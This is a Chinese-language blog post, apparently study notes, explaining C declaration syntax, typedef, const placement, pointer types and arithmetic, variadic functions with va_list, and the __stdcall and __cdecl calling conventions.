    <content type="html"><![CDATA[<p>为了六级，以前写的内容坚持用英语写，不懂得就google翻译帮助&gt;_&lt;,但是这次如果使用英语的话以后看起来应该会很难受所以就用中文写了！<br>C语言的细节肯定不会只有这么多，但是这几个出现的比较频繁，而且在C语言中也是很重要的几个语言特征。如果把这几个细节彻底弄清楚了，C语言本身的神秘就不会太多了。<br>C 语言本身就像一把异常锋利的剪刀，你可以用它做出非常精致优雅的艺术品，也可以剪出一些乱七八糟的废纸片。能够将一件武器用到出神入化那是需要时间的，需要多长时间<br>？不多，请你拿出一万个小时来，英国Exter大学心理学教授麦克.侯威专门研究神童和天才，他的结论很有意思：“一般人以为天才是自然而生、流畅而不受阻的闪亮才华，其实，<br>天才也必须耗费至少十年光阴来学习他们的特殊技能，绝无例外。要成为专家，需要拥有顽固的个性和坚持的能力……每一行的专业人士，都投注大量心血，培养自己的专业才能。”<br>注：台湾女作家、电视节目主持人吴淡如《拿出一万个小时来》。《读者》2003.1期。“不用太努力，只要持续下去。想拥有一辈子的专长或兴趣，就像一个人跑马拉松赛一样，<br>最重要的是跑完，而不是前头跑得有多快。” </p><h2 id="准备好了吗？我们开始吧-gt-lt"><a href="#准备好了吗？我们开始吧-gt-lt" class="headerlink" title="准备好了吗？我们开始吧&gt;_&lt;"></a>准备好了吗？我们开始吧&gt;_&lt;</h2><h3 id="类型的识别。"><a href="#类型的识别。" class="headerlink" title="类型的识别。"></a>类型的识别。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">int fun(char,double)函数定义如下：</div><div class="line">int(*pf)(char,double)</div><div class="line">pf=&amp;fun</div><div class="line">C语言的简写：pf=fun</div><div class="line">pf(a,8.9)函数调用时的实际操作</div><div class="line"></div><div class="line">int a[6]数组的定义如下：</div><div class="line">int (*pf)[6]</div><div class="line">pf=&amp;a</div><div class="line">int i=(*pf)[2]//将a[2]的值赋给i</div><div class="line"></div><div class="line">有了上面的基础我们可以解释下面的定义</div><div class="line">int* (*a[5])(int, char*); //＃1 </div><div class="line">void (*b[10]) (void (*)()); //＃2 </div><div class="line">doube(*)() (*pa)[9]; //＃3 </div><div class="line">首先是<span class="comment">#1：*a[5]是一个五个元素的指针，指针指向函数（int,char*）</span></div><div class="line">而这个函数的返回值类型是int型的</div><div class="line">再次就是<span class="comment">#2：*b[10]是一个元素个数为10的数组，每个元素都是一个指针</span></div><div class="line">该指针指向一个函数，类型为（void(*)()）【注1】返回值是void型的</div><div class="line">注1;这个参数有事一个指针，指向一个函数，函数参数为空，返回值void型的</div><div class="line">最后是<span class="comment">#3：pa是一个指针，指针指向一个数组，这个数组有9个元素</span></div><div class="line">每个元素都是double(*)()【注2】型的</div><div class="line">注2：也即是一个指针，指向一个函数函数参数为空，返回值是double</div><div class="line">现在是不是觉得要认识它们是易如反掌，工欲善其事，必先利其器！我们对这种</div><div class="line">表达方式熟悉之后，就可以用“typedef”来简化这种类型声明。 </div><div class="line">＃1：int* (*a[5])(int, char*); </div><div class="line">typedef int* (*PF)(int, char*);//PF是一个类型别名【注3】。 </div><div class="line">PF a[5];//跟int* (*a[5])(int, char*);的效果一样！ </div><div class="line">注 3：很多初学者只知道typedef char* pchar；但是对于typedef的其它用法不</div><div class="line">太了解。Stephen Blaha对typedef用法做过一个总结：“建立一个类型别名的方</div><div class="line">法很简单，在传统的变量声明表达式里用类型名替代变量名，然后把关键字</div><div class="line"> typedef加在该语句的开头”。 </div><div class="line">＃2：void (*b[10]) (void (*)()); </div><div class="line">typedef void (*pfv)(); </div><div class="line">typedef void (*pf_taking_pfv)(pfv); </div><div class="line">pf_taking_pfv b[10]; //跟void (*b[10]) (void (*)());的效果一样！ </div><div class="line">＃3. doube(*)() (*pa)[9]; </div><div class="line">typedef double(*PF)(); </div><div class="line">typedef PF (*PA)[9]; </div><div class="line">PA pa; //跟doube(*)() (*pa)[9];的效果一样！ </div><div class="line">3.const和volatile在类型声明中的位置 </div><div class="line">在这里我只说const，volatile是一样的【注4】！ </div><div class="line">注4：顾名思义，volatile修饰的量就是很容易变化，不稳定的量<span class="string">'</span></div><div class="line"><span class="string">它可能被其它线程，操作系统，硬件等等在未知的时间改变，所以</span></div><div class="line"><span class="string">它被存储在内存中，每次取用它的时候都只能在内存中去读取，它</span></div><div class="line"><span class="string">不能被编译器优化放在内部寄存器中。 </span></div><div class="line"><span class="string">类型声明中const用来修饰一个常量，我们一般这样使用：const在前面 </span></div><div class="line"><span class="string">const int；//int是const </span></div><div class="line"><span class="string">const char*;//char是const </span></div><div class="line"><span class="string">char* const;//*（指针）是const </span></div><div class="line"><span class="string">const char* const;//char和*都是const </span></div><div class="line"><span class="string">对初学者，const char*;和 char* const;是容易混淆的。这需要时间</span></div><div class="line"><span class="string">的历练让你习惯它。 </span></div><div class="line"><span class="string">上面的声明有一个对等的写法：const在后面 </span></div><div class="line"><span class="string">int const；//int是const </span></div><div class="line"><span class="string">char const*;//char是const </span></div><div class="line"><span class="string">char* const;//*（指针）是const </span></div><div class="line"><span class="string">char const* const;//char和*都是const </span></div><div class="line"><span class="string">第一次你可能不会习惯，但新事物如果是好的，我们为什么要拒绝它呢？：）</span></div><div class="line"><span class="string">const在后面有两个好处： </span></div><div class="line"><span class="string">A． const所修饰的类型是正好在它前面的那一个。如果这个好处还不能让你</span></div><div class="line"><span class="string">动心的话，那请看下一个！ </span></div><div class="line"><span class="string">B．我们很多时候会用到typedef的类型别名定义。比如typedef char* pchar</span></div><div class="line"><span class="string">，如果用const来修饰的话，当const在前面的时候，就是const pchar，你会</span></div><div class="line"><span class="string">以为它就是const char* ，但是你错了，它的真实含义是char* const。是不</span></div><div class="line"><span class="string">是让你大吃一惊！但如果你采用const在后面的写法，意义就怎么也不会变，</span></div><div class="line"><span class="string">不信你试试！ </span></div><div class="line"><span class="string">不过，在真实项目中的命名一致性更重要。你应该在两种情况下都能适应，并</span></div><div class="line"><span class="string">能自如的转换，公司习惯，商业利润不论在什么时候都应该优先考虑！不过在</span></div><div class="line"><span class="string">开始一个新项目的时候，你可以考虑优先使用const在后面的习惯用法。</span></div></pre></td></tr></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">它的本质是地址的类型。在许多语言中根本就没有这个概念。但是它却正是C</div><div class="line">灵活，高效，在面向过程的时代所向披靡的原因所在。因为C的内存模型基本上</div><div class="line">对应了现在von Neumann（冯·诺伊曼）计算机的机器模型，很好的达到了对机</div><div class="line">器的映射。不过有些人似乎永远也不能理解指针【注5】。 </div><div class="line">注5：Joel Spolsky就是这样认为的，他认为对指针的理解是一种aptitude，不</div><div class="line">是通过训练就可以达到的 </div><div class="line">指针可以指向值、数组、函数，当然它也可以作为值使用。 </div><div class="line">看下面的几个例子： </div><div class="line">int* p;//p是一个指针，指向一个整数 </div><div class="line">int** p;//p是一个指针，它指向第二个指针，然后指向一个整数 </div><div class="line">int (*pa)[3];//pa是一个指针，指向一个拥有3个整数的数组 </div><div class="line">int (*pf)();//pf是一个指向函数的指针，这个函数返回一个整数 </div><div class="line">后面第四节我会详细讲解标识符（identifier）类型的识别。 </div><div class="line">1.指针本身的类型是什么？ </div><div class="line">先看下面的例子：int a;//a的类型是什么？ </div><div class="line">对，把a去掉就可以了。因此上面的4个声明语句中的指针本身的类型为： </div><div class="line">int* </div><div class="line">int** </div><div class="line">int (*)[3] </div><div class="line">int (*)() </div><div class="line">它们都是复合类型，也就是类型与类型结合而成的类型。意义分别如下： </div><div class="line">point to int（指向一个整数的指针） </div><div class="line">pointer to pointer to int（指向一个指向整数的指针的指针） </div><div class="line">pointer to array of 3 ints（指向一个拥有三个整数的数组的指针） </div><div class="line">pointer to <span class="keyword">function</span> of parameter is void and <span class="built_in">return</span> value is int </div><div class="line">（指向一个函数的指针，这个函数参数为空，返回值为整数） </div><div class="line">2.指针所指物的类型是什么？ </div><div class="line">很简单，指针本身的类型去掉 “*”号就可以了，分别如下： </div><div class="line">int </div><div class="line">int* </div><div class="line">int ()[3] </div><div class="line">int ()() </div><div class="line">3和4有点怪，不是吗？请擦亮你的眼睛，在那个用来把“*”号包住的“()”</div><div class="line">是多余的，所以： </div><div class="line">int ()[3]就是int [3]（一个拥有三个整数的数组） </div><div class="line">int ()()就是int ()（一个函数，参数为空，返回值为整数）【注6】 </div><div class="line">注6：一个小小的提醒，第二个“()”是一个运算符，名字叫函数调用运算</div><div class="line">符（<span class="keyword">function</span> call operator）。 </div><div class="line">3.指针的算术运算。 </div><div class="line">请再次记住：指针不是一个简单的类型，它是一个和指针所指物的类型复合</div><div class="line">的类型。因此，它的算术运算与之（指针所指物的类型）密切相关。 </div><div class="line">int a[8]; </div><div class="line">int* p = a; </div><div class="line">int* q = p + 3; </div><div class="line">p++; </div><div class="line">指针的加减并不是指针本身的表示加减，要记住，指针是一个元素的地址，</div><div class="line">它每加一次，就指向下一个元素。所以： </div><div class="line">int* q = p + 3;//q指向从p开始的第三个整数。 </div><div class="line">p++;//p指向下一个整数。 </div><div class="line">double* pd; </div><div class="line">……//某些计算之后 </div><div class="line">double* pother = pd – 2;//pother指向从pd倒数第二个double数。 </div><div class="line">4.指针本身的大小。 </div><div class="line">在一个现代典型的32位机器上【注7】，机器的内存模型大概是这样的，想</div><div class="line">象一下，内存空间就像一个连续的房间群。每一个房间的大小是一个字节</div><div class="line">（一般是黑客动画吧8位）。有些东西大小是一个字节（比如char），一个</div><div class="line">房间就把它给安置了；但有些东西大小是几个字节（比如double就是8个字</div><div class="line">节，int就是4 个字节，我说的是典型的32位），所以它就需要几个房间才</div><div class="line">能安置。 </div><div class="line">注7：什么叫32位？就是机器CPU一次处理的数据宽度是32位，机器的寄存</div><div class="line">器容量是32位，机器的数据，内存地址总线是32位。当然还有一些细节，</div><div class="line">但大致就是这样。16位，64位，128位可以以此类推。 </div><div class="line">这些房间都应该有编号（也就是地址），32位的机器内存地址空间当然也</div><div class="line">是32位，所以房间的每一个编号都用32位的数来编码【注8】。请记住指针</div><div class="line">也可以作为值使用，作为值的时候，它也必须被安置在房间中（存储在内存</div><div class="line">中），那么指向一个值的指针需要一个地址大小来存储，即32位，4个字节，</div><div class="line">4个房间来存储。 </div><div class="line">注8：在我们平常用到的32位机器上，绝少有将32位真实内存地址空间全用完</div><div class="line">的（232 ＝ 4G），即使是服务器也不例外。现代的操作系统一般会实现32位</div><div class="line">的虚拟地址空间，这样可以方便运用程序的编制。关于虚拟地址（线性地址）</div><div class="line">和真实地址的区别以及实现，可以参考《Linux源代码情景分析》的第二章存</div><div class="line">储管理，在互联网上关于这个主题的文章汗牛充栋，</div><div class="line">，指向对象成员的指针的大小没有定值，但都是4的倍数。不同的编译器还有</div><div class="line">不同的值。对于一般的普通类（class），指向对象成员的指针大小一般为4，</div><div class="line">但在引入多重虚拟继承以及虚拟函数的时候，指向对象成员的指针会增大，</div><div class="line">不论是指向成员数据，还是成员函数。【注9】。 </div><div class="line">注9：在Andrei Alexandrescu的《Modern C++ Design》的5.13节Page124中提到</div><div class="line">，成员函数指针实际上是带标记的（tagged）unions，它们可以对付多重虚拟继</div><div class="line">承以及虚拟函数，书上说成员函数指针大小是16，但我的实践告诉我这个结果不</div><div class="line">对，而且具体编译器实现也不同。一直很想看看GCC的源代码，但由于旁骛太多</div><div class="line">，而且心不静，本身难度也比较高（这个倒是不害怕^_^），只有留待以后了。 </div><div class="line">还有一点，对一个类的static member来说，指向它的指针只是普通的函数指针，</div><div class="line">不是pointer to class member，所以它的大小是4。 </div><div class="line">5.指针运算符&amp;和* </div><div class="line">它们是一对相反的操作，&amp;取得一个东西的地址（也就是指针），*得到一个地址</div><div class="line">里放的东西。这个东西可以是值（对象）、函数、数组、类成员（class member）。 </div><div class="line">其实很简单，房间里面居住着一个人，&amp;操作只能针对人，取得房间号码； </div><div class="line">*操作只能针对房间，取得房间里的人。 </div><div class="line">参照指针本身的类型以及指针所指物的类型很好理解。 </div><div class="line">小结：其实你只要真正理解了1，2，就相当于掌握了指针的牛鼻子。后面的就不</div><div class="line">难了，指针的各种变化和C语言中其它普通类型的变化都差不多(比如各种转型)。</div></pre></td></tr></table></figure><h3 id="参数可变的函数"><a href="#参数可变的函数" class="headerlink" title="参数可变的函数"></a>参数可变的函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div></pre></td><td class="code"><pre><div class="line">C语言中有一种很奇怪的参数“…”，它主要用在引数（argument）个数不定的函</div><div class="line">数中，最常见的就是<span class="built_in">printf</span>函数。 </div><div class="line"><span class="built_in">printf</span>(“Enjoy yourself everyday!\n”); </div><div class="line"><span class="built_in">printf</span>(“The value is %d!\n”, value); </div><div class="line">…… </div><div class="line">你想过它是怎么实现的吗？ </div><div class="line">1. <span class="built_in">printf</span>为什么叫<span class="built_in">printf</span>？ </div><div class="line">不管是看什么，我总是一个喜欢刨根问底的人，对事物的源有一种特殊的癖好，</div><div class="line">一段典故，一个成语，一句行话，我最喜欢的就是找到它的来历，和当时的意境，</div><div class="line">一个外文翻译过来的术语，最低要求我会尽力去找到它原本的外文术语。特别是</div><div class="line">一个字的命名来历，我一向是非常在意的，中国有句古话：“名不正，则言不顺</div><div class="line">。 ”<span class="built_in">printf</span>中的f就是format的意思，即按格式打印【注10】。 </div><div class="line">注10：其实还有很多函数，很多变量，很多命名在各种语言中都是非常讲究的，</div><div class="line">你如果细心观察追溯，一定有很多乐趣和满足，比如哈希表为什么叫hashtable</div><div class="line">而不叫hashlist？在C++的SGI STL实现中有一个专门用于递增的函数iota（不</div><div class="line">是itoa），为什么叫这个奇怪的名字，你想过吗？ </div><div class="line">看文章我不喜欢意犹未尽，己所不欲，勿施于人，所以我把这两个答案告诉你： </div><div class="line">（1）table与list做为表讲的区别： </div><div class="line">table: </div><div class="line">-------|--------------------|------- </div><div class="line">item1 | kadkglasgaldfgl | jkdsfh </div><div class="line">-------|--------------------|------- </div><div class="line">item2 | kjdszhahlka | xcvz </div><div class="line">-------|--------------------|------- </div><div class="line">list: </div><div class="line">**** </div><div class="line">*** </div><div class="line">******* </div><div class="line">***** </div><div class="line">That<span class="string">'s the difference！ </span></div><div class="line"><span class="string">如果你还是不明白，可以去看一下hash是如何实现的！ </span></div><div class="line"><span class="string">（2）The name iota is taken from the programming language APL. </span></div><div class="line"><span class="string">而APL语言主要是做数学计算的，在数学中有很多公式会借用希腊字母， </span></div><div class="line"><span class="string">希腊字母表中有这样一个字母，大写为Ι，小写为ι， </span></div><div class="line"><span class="string">它的英文拼写正好是iota，这个字母在θ(theta)和κ(kappa)之间！ </span></div><div class="line"><span class="string">下面有一段是这样的: </span></div><div class="line"><span class="string">APL is renowned for using a set of non-ASCII symbols that are an extension</span></div><div class="line"><span class="string"> of traditional arithmetic and algebraic notation. These cryptic symbols,</span></div><div class="line"><span class="string"> some have joked, make it possible to construct an entire air traffic </span></div><div class="line"><span class="string">control system in two lines of code. Because of its condensed nature </span></div><div class="line"><span class="string">and non-standard characters, APL has sometimes been termed a</span></div><div class="line"><span class="string"> "write-only language", and reading an APL program can feel like decoding</span></div><div class="line"><span class="string"> an alien tongue. Because of the unusual character-set, many programmers </span></div><div class="line"><span class="string">used special APL keyboards in the production of APL code. Nowadays there </span></div><div class="line"><span class="string">are various ways to write APL code using only ASCII characters. </span></div><div class="line"><span class="string">在C++中有函数重载（overload）可以用来区别不同函数参数的调用，但它还是不能</span></div><div class="line"><span class="string">表示任意数量的函数参数。 </span></div><div class="line"><span class="string">在标准C语言中定义了一个头文件专门用来对付可变参数列表，它包含了一组宏</span></div><div class="line"><span class="string">，和一个va_list的typedef声明。一个典型实现如下【注11】： </span></div><div class="line"><span class="string">typedef char* va_list; </span></div><div class="line"><span class="string">#define va_start(list) list = (char*)&amp;va_alist </span></div><div class="line"><span class="string">#define va_end(list) </span></div><div class="line"><span class="string">#define va_arg(list, mode) </span></div><div class="line"><span class="string">((mode*) (list += sizeof(mode)))[-1] </span></div><div class="line"><span class="string">注11：你可以查看C99标准7.15节获得详细而权威的说明。也可以参考</span></div><div class="line"><span class="string">《C陷阱与缺陷》的附录A。 </span></div><div class="line"><span class="string">ANSI C还提供了vprintf函数，它和对应的printf函数行为方式上完全相同，只</span></div><div class="line"><span class="string">不过用va_list替换了格式字符串后的参数序列。至于它是如何实现的，你在认</span></div><div class="line"><span class="string">真读完《The C Programming Language》后，我相信你一定可以do it yourself！ </span></div><div class="line"><span class="string">使用这些工具，我们就可以实现自己的可变参数函数，比如实现一个系统化的错</span></div><div class="line"><span class="string">误处理函数error。它和printf函数的使用差不多。只不过将stream重新定向到</span></div><div class="line"><span class="string">stderr。在这里我借鉴了《C陷阱与缺陷》的附录A的例子。 </span></div><div class="line"><span class="string">实现如下： </span></div><div class="line"><span class="string">#include </span></div><div class="line"><span class="string">#include </span></div><div class="line"><span class="string">void error(char* format, …) </span></div><div class="line"><span class="string">&#123; </span></div><div class="line"><span class="string">va_list ap; </span></div><div class="line"><span class="string">va_start(ap, format); </span></div><div class="line"><span class="string">fprintf(stderr, “error: “); </span></div><div class="line"><span class="string">vfprintf(stderr, format, ap); </span></div><div class="line"><span class="string">va_end(ap); </span></div><div class="line"><span class="string">fprintf(stderr, “\n”); </span></div><div class="line"><span class="string">exit(1); </span></div><div class="line"><span class="string">&#125; </span></div><div class="line"><span class="string">你还可以自己实现printf： </span></div><div class="line"><span class="string">#include </span></div><div class="line"><span class="string">int printf(char* format, …) </span></div><div class="line"><span class="string">&#123; </span></div><div class="line"><span class="string">va_list ap; </span></div><div class="line"><span class="string">va_start(ap, format); </span></div><div class="line"><span class="string">int n = vprintf(format, ap); </span></div><div class="line"><span class="string">va_end(ap); </span></div><div class="line"><span class="string">return n; </span></div><div class="line"><span class="string">&#125; </span></div><div class="line"><span class="string">我还专门找到了VC7.1的头文件看了一下，发现各个宏的具体实现还是有区别的，</span></div><div class="line"><span class="string">跟很多预处理（preprocessor）相关。其中va_list就不一定是char*的别名。 </span></div><div class="line"><span class="string">typedef struct &#123; </span></div><div class="line"><span class="string">char *a0; /* pointer to first homed integer argument */ </span></div><div class="line"><span class="string">int offset; /* byte offset of next parameter */ </span></div><div class="line"><span class="string">&#125; va_list; </span></div><div class="line"><span class="string">其它的定义类似。 </span></div><div class="line"><span class="string">经常在Windows进行系统编程的人一定知道函数调用有好几种不同的形式</span></div><div class="line"><span class="string">，比如__stdcall，__pascal，__cdecl。在Windows下_stdcall，__pascal</span></div><div class="line"><span class="string">是一样的，所以我只说一下__stdcall和__cdecl的区别。 </span></div><div class="line"><span class="string">（1）__stdcall表示被调用端自身负责函数引数的压栈和出栈。函数参数</span></div><div class="line"><span class="string">个数一定的函数都是这种调用形式。 </span></div><div class="line"><span class="string">例如：int fun(char c, double d)，我们在main函数中使用它，这个函数</span></div><div class="line"><span class="string">就只管本身函数体的运行，参数怎么来的，怎么去的，它一概不管。自然</span></div><div class="line"><span class="string">有main负责。不过，不同的编译器的实现可能将参数从右向左压栈，也可</span></div><div class="line"><span class="string">能从左向右压栈，这个顺序我们是不能加于利用的【注12】。 </span></div><div class="line"><span class="string">注12：你可以在Herb Sutter的《More Exceptional C++》中的条款20：</span></div><div class="line"><span class="string">An Unmanaged Pointer Problem, Part 1:Parameter Evaluation找到相</span></div><div class="line"><span class="string">关的细节论述。 </span></div><div class="line"><span class="string">（2）__cdecl表示调用端负责被调用端引数的压栈和出栈。参数可变的</span></div><div class="line"><span class="string">函数采用的是这种调用形式。 </span></div><div class="line"><span class="string">为什么这种函数要采用不同于前面的调用形式呢？那是因为__stdcall</span></div><div class="line"><span class="string">调用形式对它没有作用，被调用端根本就无法知道调用端的引数个数，它</span></div><div class="line"><span class="string">怎么可能正确工作？所以这种调用方式是必须的，不过由于参数参数可变的</span></div><div class="line"><span class="string">函数本身不多，所以用的地方比较少。 </span></div><div class="line"><span class="string">对于这两种方式，你可以编制一些简单的程序，然后反汇编，在汇编代码下面</span></div><div class="line"><span class="string">你就可以看到实际的区别，很好理解的！ </span></div><div class="line"><span class="string">重载函数有很多匹配（match）规则调用。参数为“…”的函数是匹配最低的</span></div><div class="line"><span class="string">，这一点在Andrei Alexandrescu的惊才绝艳之作《Modern C++ Design》中就</span></div><div class="line"><span class="string">有用到，参看编译期间侦测可转换性和继承性”。</span></div></pre></td></tr></table></figure><p>参考自: <a href="http://hi.baidu.com/qq421681423/blog/item/0c7292ec533bd0d62e2e2105.html" target="_blank" rel="external">click here</a><br><a id="more"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为了六级，以前写的内容坚持用英语写，不懂得就google翻译帮助&amp;gt;_&amp;lt;,但是这次如果使用英语的话以后看起来应该会很难受所以就用中文写了！&lt;br&gt;C语言的细节肯定不会只有这么多，但是这几个出现的比较频繁，而且在C语言中也是很重要的几个语言特征。如果把这几个细节彻底弄清楚了，C语言本身的神秘就不会太多了。&lt;br&gt;C 语言本身就像一把异常锋利的剪刀，你可以用它做出非常精致优雅的艺术品，也可以剪出一些乱七八糟的废纸片。能够将一件武器用到出神入化那是需要时间的，需要多长时间&lt;br&gt;？不多，请你拿出一万个小时来，英国Exter大学心理学教授麦克.侯威专门研究神童和天才，他的结论很有意思：“一般人以为天才是自然而生、流畅而不受阻的闪亮才华，其实，&lt;br&gt;天才也必须耗费至少十年光阴来学习他们的特殊技能，绝无例外。要成为专家，需要拥有顽固的个性和坚持的能力……每一行的专业人士，都投注大量心血，培养自己的专业才能。”&lt;br&gt;注：台湾女作家、电视节目主持人吴淡如《拿出一万个小时来》。《读者》2003.1期。“不用太努力，只要持续下去。想拥有一辈子的专长或兴趣，就像一个人跑马拉松赛一样，&lt;br&gt;最重要的是跑完，而不是前头跑得有多快。” &lt;/p&gt;
&lt;h2 id=&quot;准备好了吗？我们开始吧-gt-lt&quot;&gt;&lt;a href=&quot;#准备好了吗？我们开始吧-gt-lt&quot; class=&quot;headerlink&quot; title=&quot;准备好了吗？我们开始吧&amp;gt;_&amp;lt;&quot;&gt;&lt;/a&gt;准备好了吗？我们开始吧&amp;gt;_&amp;lt;&lt;/h2&gt;&lt;h3 id=&quot;类型的识别。&quot;&gt;&lt;a href=&quot;#类型的识别。&quot; class=&quot;headerlink&quot; title=&quot;类型的识别。&quot;&gt;&lt;/a&gt;类型的识别。&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div 